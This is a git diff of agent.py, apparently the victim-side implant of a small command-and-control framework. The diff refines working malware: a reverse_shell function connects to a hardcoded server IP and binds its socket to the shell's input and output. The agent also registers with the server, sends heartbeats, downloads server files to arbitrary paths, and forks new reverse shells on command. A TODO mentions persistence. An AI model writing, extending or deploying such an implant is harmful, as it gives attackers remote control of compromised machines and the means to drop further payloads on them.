@@ -25,14 +25,22 @@ TODO4: Create persistence on the script itself.
 """
 # Need to have hardcoded server ip address 
 
+# TODO: This agent is turning into a mess, I need a proper agent class 
+# with proper functions 
+
 # This is hardcoded, for now 
-SERVERIP = '192.168.48.128'
+SERVERIP = '192.168.172.147'
 URL = 'http://localhost:5000'
 FIRSTCONTACTKEY = 'firstcontactkey'
 
 def reverse_shell(port):
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((SERVERIP,port))
+    try:
+        # Stop hardcoding the serverip 
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect((SERVERIP,port))
+    except Exception as e:
+        exit()
+
     os.dup2(s.fileno(),0)
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
@@ -59,33 +67,41 @@ def heartbeat(ip, user):
 
     try:
         res = requests.post(url, data=data)
-        return res.text
+        return True
     except Exception as e:
-        pass 
+        return False
 
 def firstcontact():
     url = URL + '/firstcontact'
 
     data = {'firstcontactkey': FIRSTCONTACTKEY}
 
-
-    res = requests.post(url, data=data)
+    try:
+        res = requests.post(url, data=data)
+    except Exception as e:
+        return "[-]" + str(e)
 
     global REGISTERKEY
     json_data = json.loads(res.text)
     print(res.text)
     REGISTERKEY = json_data['registerkey']
     
+    return json_data['registerkey']
+
 def register(ip, os, user):
     url = URL + '/register'
 
     data = {'registerkey': REGISTERKEY, 'ip': ip, 'os': os, 'user': user}
 
-    res = requests.post(url,data=data)
+    try:
+        res = requests.post(url,data=data)
+        data = res.json()
 
-    data = res.json()
+    except Exception as e:
+        print("[DEBUG]", str(e))
 
     if 'error' in data:
+        print("[DEBUG] Already registered, or some error have occurred.")
         exit()
 
 
@@ -119,11 +135,13 @@ def fetchCommand(ip):
                 filename = command.split(' ')[1]
                 destination_path = command.split(' ')[2]
 
+                data = {'registerkey': REGISTERKEY}
                 download_url = URL + '/download/' + filename
-                myFile = requests.get(download_url)
+                myFile = requests.post(download_url, data=data)
                 #print('[+]', myFile.content)
 
                 open(destination_path,'wb').write(myFile.content)
+
 
             except Exception as e:
                 return "[DEBUG] File Download Failed: " + str(e) 
@@ -131,7 +149,8 @@ def fetchCommand(ip):
             return '[+] Download successful. Filename: ' + filename + ' Destination: ' + destination_path 
 
         elif "shell" == command.split(' ')[0]:
-            # Spawn an independent reverse shell through fork 
+            # Spawn an independent reverse shell through fork.
+            # This fork will actually spawn a new agent.py 
             try:
                 newpid = os.fork()
                 if newpid==0:
@@ -167,11 +186,9 @@ def submit_result(ip, result):
     requests.post(url, data=data)
 
 
-def main():
+def main(): 
 
-    user = getpass.getuser()
-    print(user)
-
+    # Figure out platform 
     if "Linux" in platform.platform():
         host_os = 'Nix'
     elif "Windows" in platform.platform():
@@ -179,28 +196,41 @@ def main():
     else:
         print("[-] Unidentifiable OS type")
 
-    ip = get_ip()
-    firstcontact()
-    register(ip,host_os,user)
-    
-    while(1): 
-        beat = heartbeat(ip, user)
-        if beat is not None:
+    attempt = 1
 
+    ip = get_ip()
+    user = getpass.getuser()
+    if "[-]" in firstcontact():
+        print("[DEBUG] Unable to make first contact.", str(firstcontact()))
+        exit()
+    register(ip,host_os,user)
+
+    
+    while(1):
+        # Attempting for heartbeat 
+        heartbeat_result = heartbeat(ip,user)
+
+        if not heartbeat_result:
+            print("[DEBUG] attempt: ", str(attempt))
+            firstcontact()
+            register(ip,host_os,user)
+            attempt += 1 
+
+        if attempt > 10: 
+            print("[DEBUG] Server is dead for sure. Exiting.")
+            exit(1)
+        
+        # Heartbeat is successful. Fetching commands... 
+        if heartbeat_result is not False:
             try:
                 result = fetchCommand(ip)
             except Exception as e:
-                #print(str(e))
-                #time.sleep(10)
-                #submit_result(ip, str(e))
                 continue 
 
             # If server response that the bot doesn't have anything, just sleep.
             if isinstance(result, str) and '[-]' in result:
-                #print(result)
                 print("[-] Sleeping...")
                 time.sleep(10)
-                #submit_result(ip, "error")
                 continue
 
             #print("[DEBUG] Result:", result)
@@ -208,9 +238,9 @@ def main():
 
             print("[+] Command feteched and executed. Sleeping ... ")
             
-            # This is for production. For PoC, just sleep for 10 seconds.
-            #timerandom = random.randint(10,20)
-        
+        # This is for production. For PoC, just sleep for 10 seconds.
+        #timerandom = random.randint(10,20)
+        #time.sleep(timerandom)
         time.sleep(10)
 
 
